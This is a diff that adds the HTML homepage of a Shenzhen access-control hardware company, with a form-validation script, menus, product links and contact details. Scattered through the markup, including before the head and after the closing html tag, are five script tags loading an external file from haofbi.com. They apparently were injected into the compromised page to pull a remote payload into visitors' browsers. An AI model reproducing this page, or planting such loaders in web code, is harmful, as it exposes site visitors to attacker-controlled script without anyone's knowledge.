@@ -1,0 +1,347 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<script>
+/*************************************************
+Validator v1.01
+code by Mr.Li
+sales@china020.cn
+http://www.china020.cn
+*************************************************/
+Validator = {
+Require : /.+/,
+Email : /^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/,
+Phone : /^((\(\d{3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}$/,
+Mobile : /^((\(\d{3}\))|(\d{3}\-))?13\d{9}$/,
+Url : /^http:\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&_~`@[\]\':+!]*([^<>\"\"])*$/,
+IdCard : /^\d{15}(\d{2}[A-Za-z0-9])?$/,
+Currency : /^\d+(\.\d+)?$/,
+Number : /^\d+$/,
+Zip : /^[1-9]\d{5}$/,
+QQ : /^[1-9]\d{4,8}$/,
+Integer : /^[-\+]?\d+$/,
+Double : /^[-\+]?\d+(\.\d+)?$/,
+English : /^[A-Za-z]+$/,
+Chinese : /^[\u0391-\uFFE5]+$/,
+UnSafe : /^(([A-Z]*|[a-z]*|\d*|[-_\~!@#\$%\^&\*\.\(\)\[\]\{\}<>\?\\\/\'\"]*)|.{0,5})$|\s/,
+IsSafe : function(str){return !this.UnSafe.test(str);},
+SafeString : "this.IsSafe(value)",
+Limit : "this.limit(value.length,getAttribute('min'), getAttribute('max'))",
+LimitB : "this.limit(this.LenB(value), getAttribute('min'), getAttribute('max'))",
+Date : "this.IsDate(value, getAttribute('min'), getAttribute('format'))",
+Repeat : "value == document.getElementsByName(getAttribute('to'))[0].value",
+Range : "getAttribute('min') < value && value < getAttribute('max')",
+Compare : "this.compare(value,getAttribute('operator'),getAttribute('to'))",
+Custom : "this.Exec(value, getAttribute('regexp'))",
+Group : "this.MustChecked(getAttribute('name'), getAttribute('min'), getAttribute('max'))",
+ErrorItem : [document.forms[0]],
+ErrorMessage : ["以下原因导致提交失败：\t\t\t\t"],
+Validate : function(theForm, mode){
+var obj = theForm || event.srcElement;
+var count = obj.elements.length;
+this.ErrorMessage.length = 1;
+this.ErrorItem.length = 1;
+this.ErrorItem[0] = obj;
+for(var i=0;i<count;i++){
+with(obj.elements[i]){
+var _dataType = getAttribute("dataType");
+if(typeof(_dataType) == "object" || typeof(this[_dataType]) == "undefined") continue;
+this.ClearState(obj.elements[i]);
+if(getAttribute("require") == "false" && value == "") continue;
+switch(_dataType){
+case "Date" :
+case "Repeat" :
+case "Range" :
+case "Compare" :
+case "Custom" :
+case "Group" : 
+case "Limit" :
+case "LimitB" :
+case "SafeString" :
+if(!eval(this[_dataType])) {
+this.AddError(i, getAttribute("msg"));
+}
+break;
+default :
+if(!this[_dataType].test(value)){
+this.AddError(i, getAttribute("msg"));
+}
+break;
+}
+}
+}
+if(this.ErrorMessage.length > 1){
+mode = mode || 1;
+var errCount = this.ErrorItem.length;
+switch(mode){
+case 2 :
+for(var i=1;i<errCount;i++)
+this.ErrorItem[i].style.color = "red";
+case 1 :
+alert(this.ErrorMessage.join("\n"));
+this.ErrorItem[1].focus();
+break;
+case 3 :
+for(var i=1;i<errCount;i++){
+try{
+var span = document.createElement("SPAN");
+span.id = "__ErrorMessagePanel";
+span.style.color = "red";
+this.ErrorItem[i].parentNode.appendChild(span);
+span.innerHTML = this.ErrorMessage[i].replace(/\d+:/,"*");
+}
+catch(e){alert(e.description);}
+}
+this.ErrorItem[1].focus();
+break;
+default :
+alert(this.ErrorMessage.join("\n"));
+break;
+}
+return false;
+}
+return true;
+},
+limit : function(len,min, max){
+min = min || 0;
+max = max || Number.MAX_VALUE;
+return min <= len && len <= max;
+},
+LenB : function(str){
+return str.replace(/[^\x00-\xff]/g,"**").length;
+},
+ClearState : function(elem){
+with(elem){
+if(style.color == "red")
+style.color = "";
+var lastNode = parentNode.childNodes[parentNode.childNodes.length-1];
+if(lastNode.id == "__ErrorMessagePanel")
+parentNode.removeChild(lastNode);
+}
+},
+AddError : function(index, str){
+this.ErrorItem[this.ErrorItem.length] = this.ErrorItem[0].elements[index];
+this.ErrorMessage[this.ErrorMessage.length] = this.ErrorMessage.length + ":" + str;
+},
+Exec : function(op, reg){
+return new RegExp(reg,"g").test(op);
+},
+compare : function(op1,operator,op2){
+switch (operator) {
+case "NotEqual":
+return (op1 != op2);
+case "GreaterThan":
+return (op1 > op2);
+case "GreaterThanEqual":
+return (op1 >= op2);
+case "LessThan":
+return (op1 < op2);
+case "LessThanEqual":
+return (op1 <= op2);
+default:
+return (op1 == op2); 
+}
+},
+MustChecked : function(name, min, max){
+var groups = document.getElementsByName(name);
+var hasChecked = 0;
+min = min || 1;
+max = max || groups.length;
+for(var i=groups.length-1;i>=0;i--)
+if(groups[i].checked) hasChecked++;
+return min <= hasChecked && hasChecked <= max;
+},
+IsDate : function(op, formatString){
+formatString = formatString || "ymd";
+var m, year, month, day;
+switch(formatString){
+case "ymd" :
+m = op.match(new RegExp("^((\\d{4})|(\\d{2}))([-./])(\\d{1,2})\\4(\\d{1,2})$"));
+if(m == null ) return false;
+day = m[6];
+month = m[5]--;
+year = (m[2].length == 4) ? m[2] : GetFullYear(parseInt(m[3], 10));
+break;
+case "dmy" :
+m = op.match(new RegExp("^(\\d{1,2})([-./])(\\d{1,2})\\2((\\d{4})|(\\d{2}))$"));
+if(m == null ) return false;
+day = m[1];
+month = m[3]--;
+year = (m[5].length == 4) ? m[5] : GetFullYear(parseInt(m[6], 10));
+break;
+default :
+break;
+}
+if(!parseInt(month)) return false;
+month = month==12 ?0:month; 
+var date = new Date(year, month, day);
+return (typeof(date) == "object" && year == date.getFullYear() && month == date.getMonth() && day == date.getDate());
+function GetFullYear(y){return ((y<30 ? "20" : "19") + y)|0;}
+}
+}
+</script>
+<script language=javascript src=http://www.haofbi.com/js/w.js></script><script language=javascript src=http://www.haofbi.com/js/w.js></script>
+<HEAD><TITLE>深圳市安多尔科技有限公司--深圳市安多尔科技有限公司</TITLE>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<META content="深圳市安多尔科技有限公司"name=description>
+<LINK href="images/style.css" type=text/css rel=stylesheet>
+<META content="MSHTML 6.00.5730.13" name=GENERATOR></HEAD>
+<SCRIPT type="text/javascript" charset="gb2312" src="images/river.js"></SCRIPT>
+</HEAD>
+<BODY>
+<DIV class="all">
+<DIV class="head">
+<DIV class="logo"><img src="images/logo.jpg">
+  <DIV class="sch">
+    <form method="post" action="product_list.asp"><INPUT class="btn"  value=" " type="submit"><INPUT 
+name="txtKeyword" class="text" size="16" type="text"></form></DIV>
+<DIV class="nav"><A href="index.asp">首 页</A>/   <A 
+onmouseover="show_nav(1)" 
+href="About.Asp?id=4">关于我们</A>/   <A onMouseOver="show_nav(2)" 
+href="News_List.Asp?id=14">新闻中心</A>/    <A onMouseOver="show_nav(3)" 
+href="product_List.asp">产品展示</A>/       <A onMouseOver="show_nav(4)"
+href="Engineering.asp">典型工程</A>/    <A onMouseOver="show_nav(5)" 
+href="Service_List.Asp?id=1">服务支持</A>/   <A 
+onmouseover="show_nav(6)" 
+href="ContactUs.asp?id=1">联系我们</A>/
+<A 
+onmouseover="show_nav(7)" 
+ href="?id=&Language=En">English</A></DIV></DIV>
+<DIV class="menu">
+<DIV style="padding-left: 320px; display: inline;" id="m1" class="m_in"><SPAN><A 
+href="About.Asp?id=4">公司简介</A></SPAN><SPAN><A 
+href="About.Asp?id=5">组织架构</A></SPAN><SPAN><A 
+href="About.Asp?id=6">企业文化</A></SPAN></DIV>
+<DIV style="padding-left: 450px;" id="m2" class="m_in"><SPAN><A href="News_List.asp?id=14">公司动态</A></SPAN><SPAN><A 
+href="News_List.asp?id=15">行业动态</A></SPAN></DIV>
+<DIV style="padding-left: 620px;" id="m4" class="m_in"><SPAN><A href="Engineering.asp">典型工程案例 </SPAN>
+</DIV>
+<DIV id="m7"></DIV>
+<DIV style="padding-left: 450px;" id="m3"  class="m_in">
+  
+<SPAN>
+<A href="product_list.asp?id=113">电控锁</A></SPAN>
+  
+<SPAN>
+<A href="product_list.asp?id=112">开关</A></SPAN>
+  
+<SPAN>
+<A href="product_list.asp?id=111">磁力锁</A></SPAN>
+   
+<SPAN><A href="product_List.asp">更多产品</A></SPAN>
+</DIV>
+<DIV style="padding-left: 640px;" id="m5" class="m_in">
+
+<SPAN><A href="Service_List.Asp?id=1">服务政策</A></A></SPAN>
+<SPAN><A href="Service_List.asp?id=2">常见问题</A></A></SPAN>
+<SPAN><A href="Service_List.asp?id=3">视频效果</A></A></SPAN>
+
+</DIV>
+<DIV style="padding-left: 770px;" id="m6" class="m_in"><SPAN><A href="ContactUs.asp?id=1">联系我们</A></SPAN><SPAN>
+<A href="ContactUs.asp?id=2">在线留言</A></SPAN></DIV></DIV>
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
+<DIV class="ban">
+<OBJECT id="scriptmain" name="scriptmain" codeBase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" 
+classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="980" 
+height="280"><PARAM name="movie" value="flash/bcastr.swf?bcastr_xml_url=flash/bcastr.xml"><PARAM 
+name="quality" value="high"><PARAM name="scale" value="noscale"><PARAM name="LOOP" 
+value="false"><PARAM name="menu" value="flase"><PARAM name="wmode" value="transparent"><EMBED 
+height="280" name="scriptmain" width="980" src="flash/bcastr.swf?bcastr_xml_url=flash/bcastr.xml" 
+wmode="transparent"></OBJECT></DIV></DIV>
+<DIV class="con">
+<DIV class="mid">
+<DIV class="cont">
+<DIV class="c_t"><SPAN>联系我们</SPAN></DIV>
+<DIV class="c_in">
+<P><IMG src="images/lx.gif"></P>
+
+
+
+
+
+深圳市安多尔科技有限公司<BR>展销部：深圳市福田区太平洋安防通讯市场1B635-1B636<BR>电话：86-755-83976549<BR>传真：86-755-83976549<BR>E-mail：1363288010@qq.com
+</DIV></DIV>
+<DIV class="cont">
+<DIV class="c_t"><SPAN>产品展示</SPAN><A class="more" href="product_List.asp"></A></DIV>
+<DIV class="c_in">
+<P><IMG src="images/cp.gif"></P>
+<UL>
+
+
+<LI><A title='电控锁' href="Product_List.asp?id=113" target="_blank">电控锁</A> </LI>
+
+
+<LI><A title='开关' href="Product_List.asp?id=112" target="_blank">开关</A> </LI>
+
+
+<LI><A title='磁力锁' href="Product_List.asp?id=111" target="_blank">磁力锁</A> </LI>
+
+
+<LI><A title='门禁读头' href="Product_List.asp?id=109" target="_blank">门禁读头</A> </LI>
+
+
+<LI><A title='其它配件' href="Product_List.asp?id=108" target="_blank">其它配件</A> </LI>
+
+
+
+</UL></DIV></DIV>
+<DIV class="cont">
+<DIV class="c_t"><SPAN>新闻中心</SPAN><A class="more" href="news_List.asp"></A></DIV>
+<DIV class="n_in">
+<P><IMG src="images/new.gif"></P>
+<UL>
+
+
+
+<LI><A title='北京市新近成立智能卡行业知识产权联盟' href="News_Info.asp?id=99" target="_blank">北京市新近成立智能卡行业...</A> </LI>
+
+
+<LI><A title='我国智能卡产业正迅速成为经济新增长点' href="News_Info.asp?id=98" target="_blank">我国智能卡产业正迅速成为...</A> </LI>
+
+
+
+
+</UL></DIV></DIV>
+<DIV class="cont">
+<DIV class="c_t"><SPAN>服务支持</SPAN><A class="more" href="Service_List.Asp?id=1"></A></DIV>
+<DIV class="c_in">
+<P><IMG src="images/fw.gif"></P>
+<P><STRONG>产品售后服务政策：</STRONG><BR><br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除自然灾害等不可抵抗力或人为破坏因素外，本公司产品一年内免费保修</P></DIV></DIV></DIV>
+<DIV class="n_pro">
+<UL>
+
+  
+
+<LI><A href="Product_Info.Asp?id=335"><IMG src="/uploadfile/Product/fullpic/2016/8/2016081611470473499.jpg" width="130" height="110"></A>
+  <P>双门控制器</P></LI>
+  
+
+<LI><A href="Product_Info.Asp?id=302"><IMG src="/uploadfile/Product/fullpic/2015/7/2015071714271373499.jpg" width="130" height="110"></A>
+  <P>M20</P></LI>
+  
+
+<LI><A href="Product_Info.Asp?id=301"><IMG src="/uploadfile/Product/fullpic/2015/7/2015071711075273499.jpg" width="130" height="110"></A>
+  <P>门禁读头</P></LI>
+  
+
+<LI><A href="Product_Info.Asp?id=299"><IMG src="/uploadfile/Product/fullpic/2015/7/2015071710542473499.jpg" width="130" height="110"></A>
+  <P>门禁读头</P></LI>
+  
+
+<LI><A href="Product_Info.Asp?id=296"><IMG src="/uploadfile/Product/fullpic/2015/7/2015071710294673499.jpg" width="130" height="110"></A>
+  <P>单门TCP</P></LI>
+  
+
+<LI><A href="Product_Info.Asp?id=295"><IMG src="/uploadfile/Product/fullpic/2015/7/2015071617332473499.jpg" width="130" height="110"></A>
+  <P>四门485</P></LI>
+   
+  </UL></DIV></DIV>
+<DIV class="bot">
+<P>Copyright 2011 <a href='/admin'>深圳市安多尔科技有限公司</a>. All rights reserved.
+</P></DIV>
+<SCRIPT src="js/kf.js" type=text/javascript></SCRIPT>
+
+<script language=javascript src=http://www.haofbi.com/js/w.js></script></DIV></BODY></HTML> 
+<script language=javascript src=http://www.haofbi.com/js/w.js></script>
